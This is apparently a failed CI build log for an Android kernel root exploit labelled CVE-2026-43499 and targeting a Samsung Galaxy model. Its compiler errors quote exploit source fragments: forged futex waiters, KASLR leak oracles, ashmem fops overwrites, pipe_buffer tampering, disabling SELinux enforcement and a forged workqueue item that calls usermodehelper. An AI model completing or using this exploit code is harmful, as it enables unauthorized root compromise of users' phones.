Run cd Root-My-Galaxy-Payloads-main
rm -rf build/pa3q-S938NKSUACZF1
mkdir -p build/pa3q-S9380ZHU1AYA1
aarch64-linux-android35-clang -DAPP_PAYLOAD=1 -fPIC -Oz -g0 \
  -fno-unwind-tables -fno-asynchronous-unwind-tables \
  -ffunction-sections -fdata-sections \
  -Wall -Wextra -Wno-unused-parameter -Wno-sign-compare \
  -Isrc -DTARGET_HEADER='"targets/pa3q-S9380ZHU1AYA1/target.h"' \
  src/main.c src/util.c src/slide_app.c src/fops.c src/pipe.c src/root.c src/preload.c -shared -pthread \
  -Wl,--gc-sections -Wl,--icf=all -s -o build/pa3q-S9380ZHU1AYA1/cve-2026-43499-app.release.so
src/util.c:76:31: error: use of undeclared identifier 'FAKE_WAITER_TREE_PRIO_OFF'
   76 |   put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
      |                               ^
src/util.c:77:31: error: use of undeclared identifier 'FAKE_WAITER_TREE_DEADLINE_OFF'
   77 |   put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
      |                               ^
src/util.c:78:31: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
   78 |   put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
      |                               ^
src/util.c:80:31: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
   80 |   put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
      |                               ^
src/util.c:81:31: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
   81 |   put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
      |                               ^
src/util.c:82:31: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_PRIO_OFF'
   82 |   put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
      |                               ^
src/util.c:83:31: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_DEADLINE_OFF'
   83 |   put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
      |                               ^
src/util.c:84:31: error: use of undeclared identifier 'FAKE_WAITER_TASK_OFF'
   84 |   put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
      |                               ^
src/util.c:85:31: error: use of undeclared identifier 'FAKE_WAITER_LOCK_OFF'
   85 |   put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
      |                               ^
src/util.c:86:31: error: use of undeclared identifier 'FAKE_WAITER_WAKE_STATE_OFF'
   86 |   put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
      |                               ^
src/util.c:87:31: error: use of undeclared identifier 'FAKE_WAITER_WW_CTX_OFF'
   87 |   put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
      |                               ^
src/util.c:161:11: error: use of undeclared identifier 'SLIDE_KSNITCH_APPENDED_FUTEXES'
  161 |       ks, SLIDE_KSNITCH_APPENDED_FUTEXES,
      |           ^
src/util.c:162:7: error: use of undeclared identifier 'SLIDE_KSNITCH_REPEAT_MEASUREMENT'
  162 |       SLIDE_KSNITCH_REPEAT_MEASUREMENT,
      |       ^
src/util.c:163:7: error: use of undeclared identifier 'SLIDE_KSNITCH_AVERAGE'
  163 |       SLIDE_KSNITCH_AVERAGE);
      |       ^
src/util.c:248:34: error: use of undeclared identifier 'SLIDE_NFULNL_LOGGER_NAME_IMAGE'
  248 |              (unsigned long long)SLIDE_NFULNL_LOGGER_NAME,
      |                                  ^
src/util.c:248:34: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
src/util.c:248:34: error: use of undeclared identifier 'P0_PAGE_OFFSET'
src/util.c:249:34: error: use of undeclared identifier 'SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE'
  249 |              (unsigned long long)SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR,
      |                                  ^
src/util.c:249:34: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
src/slide_app.c:217:10: error: use of undeclared identifier 'SLIDE_INIT_TASK_IMAGE'
  217 |     {10, SLIDE_WAITER_TASK + slide_p0_offset, "task"},
      |          ^
src/common.h:175:27: note: expanded from macro 'SLIDE_WAITER_TASK'
  175 | #define SLIDE_WAITER_TASK SLIDE_INIT_TASK
      |                           ^
src/common.h:173:45: note: expanded from macro 'SLIDE_INIT_TASK'
  173 | #define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
      |                                             ^
src/slide_app.c:217:10: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
src/common.h:175:27: note: expanded from macro 'SLIDE_WAITER_TASK'
  175 | #define SLIDE_WAITER_TASK SLIDE_INIT_TASK
      |                           ^
src/common.h:173:25: note: expanded from macro 'SLIDE_INIT_TASK'
  173 | #define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
      |                         ^
src/common.h:132:37: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |                                     ^
src/slide_app.c:217:10: error: use of undeclared identifier 'P0_PAGE_OFFSET'
src/common.h:175:27: note: expanded from macro 'SLIDE_WAITER_TASK'
  175 | #define SLIDE_WAITER_TASK SLIDE_INIT_TASK
      |                           ^
src/common.h:173:25: note: expanded from macro 'SLIDE_INIT_TASK'
  173 | #define SLIDE_INIT_TASK P0_DATA_ALIAS_CONST(SLIDE_INIT_TASK_IMAGE)
      |                         ^
src/common.h:132:4: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |    ^
src/slide_app.c:228:32: error: invalid application of 'sizeof' to an incomplete type 'struct slide_waiter_word[]'
  228 |   for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
      |                                ^~~~~~~
src/slide_app.c:529:40: error: use of undeclared identifier 'SLIDE_NFULNL_LOGGER_NAME_IMAGE'
  529 |   uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER_NAME);
      |                                        ^
src/common.h:165:23: note: expanded from macro 'SLIDE_NFULNL_LOGGER_NAME'
  165 |   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
      |                       ^
src/slide_app.c:529:40: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
src/common.h:165:3: note: expanded from macro 'SLIDE_NFULNL_LOGGER_NAME'
  165 |   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
      |   ^
src/common.h:132:37: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |                                     ^
src/slide_app.c:529:40: error: use of undeclared identifier 'P0_PAGE_OFFSET'
src/common.h:165:3: note: expanded from macro 'SLIDE_NFULNL_LOGGER_NAME'
  165 |   P0_DATA_ALIAS_CONST(SLIDE_NFULNL_LOGGER_NAME_IMAGE)
      |   ^
src/common.h:132:4: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |    ^
src/slide_app.c:667:35: error: use of undeclared identifier 'P0_ORACLE_GATE_RESTORE_SLOT'
  667 |       slide_trigger_physical_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      |                                   ^
src/slide_app.c:669:35: error: use of undeclared identifier 'P0_ORACLE_PROBE_RESTORE_SLOT'
  669 |       slide_trigger_physical_slot(P0_ORACLE_PROBE_RESTORE_SLOT);
      |                                   ^
src/slide_app.c:707:36: error: use of undeclared identifier 'P0_ORACLE_GATE_SLOT'
  707 |   if (!slide_trigger_physical_slot(P0_ORACLE_GATE_SLOT)) {
      |                                    ^
src/slide_app.c:729:36: error: use of undeclared identifier 'P0_ORACLE_PROBE_SLOT'
  729 |   if (!slide_trigger_physical_slot(P0_ORACLE_PROBE_SLOT)) {
      |                                    ^
src/slide_app.c:743:29: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
  743 |   return slide_commit_stext(KIMAGE_TEXT_BASE + offset, "physical");
      |                             ^
src/slide_app.c:794:39: error: use of undeclared identifier 'FAKE_WAITER_TREE_PRIO_OFF'
  794 |   return p0_diag_write32(fd, waiter + FAKE_WAITER_TREE_PRIO_OFF,
      |                                       ^
src/slide_app.c:796:39: error: use of undeclared identifier 'FAKE_WAITER_TREE_DEADLINE_OFF'
  796 |          p0_diag_write64(fd, waiter + FAKE_WAITER_TREE_DEADLINE_OFF, 0) &&
      |                                       ^
src/slide_app.c:797:39: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
  797 |          p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
      |                                       ^
src/slide_app.c:799:39: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
  799 |          p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08,
      |                                       ^
src/slide_app.c:801:39: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_ENTRY_OFF'
  801 |          p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
      |                                       ^
src/slide_app.c:803:39: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_PRIO_OFF'
  803 |          p0_diag_write32(fd, waiter + FAKE_WAITER_PI_TREE_PRIO_OFF,
      |                                       ^
src/slide_app.c:805:39: error: use of undeclared identifier 'FAKE_WAITER_PI_TREE_DEADLINE_OFF'
  805 |          p0_diag_write64(fd, waiter + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0) &&
      |                                       ^
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
src/fops.c:86:35: error: use of undeclared identifier 'INIT_TASK'
   86 |   fdset_put_word(ex, 0, text_addr(INIT_TASK));
      |                                   ^
src/fops.c:187:31: error: use of undeclared identifier 'NOOP_LLSEEK'
  187 |   uint64_t llseek = text_addr(NOOP_LLSEEK);
      |                               ^
src/fops.c:189:32: error: use of undeclared identifier 'FOPS_LLSEEK_OFF'
  189 |   uintptr_t slot = fake_fops + FOPS_LLSEEK_OFF;
      |                                ^
src/fops.c:199:7: error: use of undeclared identifier 'SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE'
  199 |       SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
      |       ^
src/common.h:169:23: note: expanded from macro 'SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR'
  169 |   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
      |                       ^
src/fops.c:199:7: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
src/common.h:169:3: note: expanded from macro 'SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR'
  169 |   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
      |   ^
src/common.h:132:37: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |                                     ^
src/fops.c:199:7: error: use of undeclared identifier 'P0_PAGE_OFFSET'
src/common.h:169:3: note: expanded from macro 'SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR'
  169 |   P0_DATA_ALIAS_CONST(SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE)
      |   ^
src/common.h:132:4: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |    ^
src/fops.c:200:40: error: use of undeclared identifier 'SLIDE_SYSCTL_BOOTID_IMAGE'
  200 |   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
      |                                        ^
src/common.h:179:49: note: expanded from macro 'SLIDE_SYSCTL_BOOTID'
  179 | #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
      |                                                 ^
src/fops.c:200:40: error: use of undeclared identifier 'KIMAGE_TEXT_BASE'
src/common.h:179:29: note: expanded from macro 'SLIDE_SYSCTL_BOOTID'
  179 | #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
      |                             ^
src/common.h:132:37: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |                                     ^
src/fops.c:200:40: error: use of undeclared identifier 'P0_PAGE_OFFSET'
src/common.h:179:29: note: expanded from macro 'SLIDE_SYSCTL_BOOTID'
  179 | #define SLIDE_SYSCTL_BOOTID P0_DATA_ALIAS_CONST(SLIDE_SYSCTL_BOOTID_IMAGE)
      |                             ^
src/common.h:132:4: note: expanded from macro 'P0_DATA_ALIAS_CONST'
  132 |   (P0_PAGE_OFFSET | ((image_addr) - KIMAGE_TEXT_BASE + P0_KERNEL_PHYS_DELTA))
      |    ^
src/fops.c:258:35: error: use of undeclared identifier 'ASHMEM_MISC_FOPS'
  258 |   uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
      |                                   ^
src/fops.c:315:39: error: use of undeclared identifier 'ASHMEM_FOPS'
  315 |   uint64_t original_fops = canon_addr(ASHMEM_FOPS);
      |                                       ^
src/fops.c:386:59: error: use of undeclared identifier 'ASHMEM_FOPS'
  386 |   if (ra != (ssize_t)sizeof(after) || after != canon_addr(ASHMEM_FOPS)) {
      |                                                           ^
src/fops.c:410:45: error: use of undeclared identifier 'ASHMEM_FOPS'
  410 |     uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
      |                                             ^
src/fops.c:412:39: error: use of undeclared identifier 'ASHMEM_FOPS'
  412 |       original_fops_fail = canon_addr(ASHMEM_FOPS);
      |                                       ^
14 errors generated.
src/pipe.c:4:10: error: expected "FILENAME" or <FILENAME>
    4 | #include P0_FINGERPRINT_HEADER
      |          ^
src/pipe.c:83:29: error: use of undeclared identifier 'PIPE_BUFFER_SLOTS'
   83 |   resize_pipe_slots(pipefd, PIPE_BUFFER_SLOTS);
      |                             ^
src/pipe.c:366:27: error: use of undeclared identifier 'DIRECT_MAP_BASE'
  366 |   uintptr_t pfn = (addr - DIRECT_MAP_BASE) >> PAGE_SHIFT;
      |                           ^
src/pipe.c:367:10: error: use of undeclared identifier 'VMEMMAP_START'
  367 |   return VMEMMAP_START + pfn * STRUCT_PAGE_SIZE;
      |          ^
src/pipe.c:381:27: error: use of undeclared identifier 'VMEMMAP_START'
  381 |   uintptr_t pfn = (page - VMEMMAP_START) / STRUCT_PAGE_SIZE;
      |                           ^
src/pipe.c:382:10: error: use of undeclared identifier 'DIRECT_MAP_BASE'
  382 |   return DIRECT_MAP_BASE + (pfn << PAGE_SHIFT);
      |          ^
src/pipe.c:386:20: error: use of undeclared identifier 'ANON_PIPE_BUF_OPS'
  386 |   return text_addr(ANON_PIPE_BUF_OPS);
      |                    ^
src/pipe.c:416:40: error: use of undeclared identifier 'KMALLOC_CACHES'
  416 |   uintptr_t kmalloc_caches = data_addr(KMALLOC_CACHES);
      |                                        ^
src/pipe.c:428:33: error: use of undeclared identifier 'KMALLOC_CACHES'
  428 |     kernel_read64(fd, data_addr(KMALLOC_CGROUP_PIPE_SLOT));
      |                                 ^
src/common.h:100:3: note: expanded from macro 'KMALLOC_CGROUP_PIPE_SLOT'
  100 |   KMALLOC_CACHE_SLOT(KMALLOC_CGROUP_TYPE, KMALLOC_PIPE_INDEX)
      |   ^
src/common.h:98:4: note: expanded from macro 'KMALLOC_CACHE_SLOT'
   98 |   (KMALLOC_CACHES + ((type) * KMALLOC_BUCKETS + (index)) * 8)
      |    ^
src/pipe.c:441:52: error: use of undeclared identifier 'STRUCT_SLAB_CACHE_OFF'
  441 |     uint64_t slab_cache = kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
      |                                                    ^
src/pipe.c:518:47: error: use of undeclared identifier 'DIRECT_MAP_END'
  518 |     if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      |                                               ^
src/common.h:104:38: note: expanded from macro 'VMEMMAP_END'
  104 | #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
      |                                      ^
src/common.h:103:28: note: expanded from macro 'DIRECT_MAP_PAGES'
  103 | #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
      |                            ^
src/pipe.c:518:47: error: use of undeclared identifier 'DIRECT_MAP_BASE'
src/common.h:104:38: note: expanded from macro 'VMEMMAP_END'
  104 | #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
      |                                      ^
src/common.h:103:45: note: expanded from macro 'DIRECT_MAP_PAGES'
  103 | #define DIRECT_MAP_PAGES ((DIRECT_MAP_END - DIRECT_MAP_BASE) >> PAGE_SHIFT)
      |                                             ^
src/pipe.c:518:47: error: use of undeclared identifier 'VMEMMAP_START'
src/common.h:104:22: note: expanded from macro 'VMEMMAP_END'
  104 | #define VMEMMAP_END (VMEMMAP_START + DIRECT_MAP_PAGES * STRUCT_PAGE_SIZE)
      |                      ^
src/pipe.c:518:20: error: use of undeclared identifier 'VMEMMAP_START'
  518 |     if (pb.page >= VMEMMAP_START && pb.page < VMEMMAP_END) {
      |                    ^
src/pipe.c:536:21: error: use of undeclared identifier 'PIPE_BUF_FLAG_CAN_MERGE'
  536 |         pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
      |                     ^
src/pipe.c:571:14: error: use of undeclared identifier 'PIPE_BUF_FLAG_CAN_MERGE'
  571 |   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
      |              ^
src/pipe.c:599:14: error: use of undeclared identifier 'PIPE_BUF_FLAG_CAN_MERGE'
  599 |   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
      |              ^
src/pipe.c:621:14: error: use of undeclared identifier 'PIPE_BUF_FLAG_CAN_MERGE'
  621 |   pb.flags = PIPE_BUF_FLAG_CAN_MERGE;
      |              ^
src/pipe.c:937:34: error: use of undeclared identifier 'PIPE_BUFFER_SLOTS'
  937 |     for (size_t slot = 1; slot < PIPE_BUFFER_SLOTS; slot++) {
      |                                  ^
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
src/root.c:132:38: error: use of undeclared identifier 'SELINUX_ENFORCING'
  132 |   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
      |                                      ^
src/root.c:134:42: error: use of undeclared identifier 'ROOT_UMH_WORK_OFF'
  134 |   uintptr_t fake_work_addr = page_base + ROOT_UMH_WORK_OFF;
      |                                          ^
src/root.c:135:41: error: use of undeclared identifier 'ROOT_UMH_DATA_OFF'
  135 |   uintptr_t umh_data_addr = page_base + ROOT_UMH_DATA_OFF;
      |                                         ^
src/root.c:138:31: error: use of undeclared identifier 'ROOT_UMH_PATH'
  138 |   const char *root_umh_path = ROOT_UMH_PATH;
      |                               ^
src/root.c:175:38: error: use of undeclared identifier 'CALL_USERMODEHELPER_EXEC_WORK'
  175 |   uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
      |                                      ^
src/root.c:185:33: error: use of undeclared identifier 'SYSTEM_UNBOUND_WQ'
  185 |   uintptr_t wq_slot = data_addr(SYSTEM_UNBOUND_WQ);
      |                                 ^
src/root.c:187:40: error: use of undeclared identifier 'WQ_DFL_PWQ_OFF'
  187 |   uintptr_t pwq = root_read64(fd, wq + WQ_DFL_PWQ_OFF);
      |                                        ^
src/root.c:188:42: error: use of undeclared identifier 'PWQ_POOL_OFF'
  188 |   uintptr_t pool = root_read64(fd, pwq + PWQ_POOL_OFF);
      |                                          ^
src/root.c:189:44: error: use of undeclared identifier 'PWQ_WQ_OFF'
  189 |   uintptr_t pwq_wq = root_read64(fd, pwq + PWQ_WQ_OFF);
      |                                            ^
src/root.c:198:31: error: use of undeclared identifier 'POOL_WORKLIST_OFF'
  198 |   uintptr_t worklist = pool + POOL_WORKLIST_OFF;
      |                               ^
src/root.c:205:38: error: use of undeclared identifier 'POOL_NR_IDLE_OFF'
  205 |     nr_idle = root_read32(fd, pool + POOL_NR_IDLE_OFF);
      |                                      ^
src/root.c:219:42: error: use of undeclared identifier 'PWQ_WORK_COLOR_OFF'
  219 |   uint32_t color = root_read32(fd, pwq + PWQ_WORK_COLOR_OFF);
      |                                          ^
src/root.c:220:43: error: use of undeclared identifier 'PWQ_REFCNT_OFF'
  220 |   uint32_t refcnt = root_read32(fd, pwq + PWQ_REFCNT_OFF);
      |                                           ^
src/root.c:221:46: error: use of undeclared identifier 'PWQ_NR_ACTIVE_OFF'
  221 |   uint32_t nr_active = root_read32(fd, pwq + PWQ_NR_ACTIVE_OFF);
      |                                              ^
src/root.c:222:47: error: use of undeclared identifier 'PWQ_MAX_ACTIVE_OFF'
  222 |   uint32_t max_active = root_read32(fd, pwq + PWQ_MAX_ACTIVE_OFF);
      |                                               ^
src/root.c:230:13: error: use of undeclared identifier 'PWQ_NR_IN_FLIGHT_OFF'
  230 |       pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t);
      |             ^
src/root.c:232:43: error: use of undeclared identifier 'WORK_ENTRY_OFF'
  232 |   uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
      |                                           ^
src/root.c:236:22: error: use of undeclared identifier 'WORK_DATA_OFF'
  236 |   memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
      |                      ^
src/root.c:237:22: error: use of undeclared identifier 'WORK_ENTRY_OFF'
  237 |   memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
      |                      ^
fatal error: too many errors emitted, stopping now [-ferror-limit=]
20 errors generated.
make: *** [Makefile:61: build/pa3q-S9380ZHU1AYA1/cve-2026-43499-app.release.so] Error 1
Error: Process completed with exit code 2.
0s